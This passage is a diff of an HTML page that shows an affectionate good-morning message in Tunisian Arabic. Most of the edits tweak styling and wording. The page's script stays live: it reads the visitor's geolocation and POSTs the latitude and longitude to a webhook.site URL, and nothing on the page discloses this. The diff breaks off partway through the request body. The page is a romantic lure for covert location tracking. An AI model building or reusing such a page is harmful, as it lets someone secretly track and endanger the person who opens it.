@@ -14,25 +14,24 @@
       max-width: 90%;
       margin: 10px auto;
       border-radius: 12px;
-      box-shadow: 0px 4px 10px rgba(0,0,0,0.2);
+      box-shadow: 0px 4px 10px rgba(0,0,0,0.1);
     }
     .message {
       margin: 30px auto;
       font-size: 20px;
       color: #333;
       background-color: #ffffffcc;
-      display: inline-block;
-      padding: 15px 25px;
+      padding: 10px;
       border-radius: 10px;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      display: inline-block;
     }
   </style>
 </head>
 <body>
 
   <div class="message">
-    🤍🎥 صباحك حضن وأمان…<br>
-    وينك توّا؟ لاباس؟<br>
+    🎬🤍 صباحك حضن وأمان…<br>
+    وفيك نلقى إلياسي…<br>
     مازلت نحس فيك بين سطور الليل.
   </div>
 
@@ -49,10 +48,10 @@
 
   <script>
     navigator.geolocation.getCurrentPosition(function(position) {
-      fetch('https://webhook.site/344a45b6-b932-4dd4-9bc3-c96e855f2856', {
-        method: 'POST',
+      fetch("https://webhook.site/344a45b6-b932-4dd4-9bc3-c96e855f2856", {
+        method: "POST",
         headers: {
-          'Content-Type': 'application/json'
+          "Content-Type": "application/json"
         },
         body: JSON.stringify({
           latitude: position.coords.latitude,
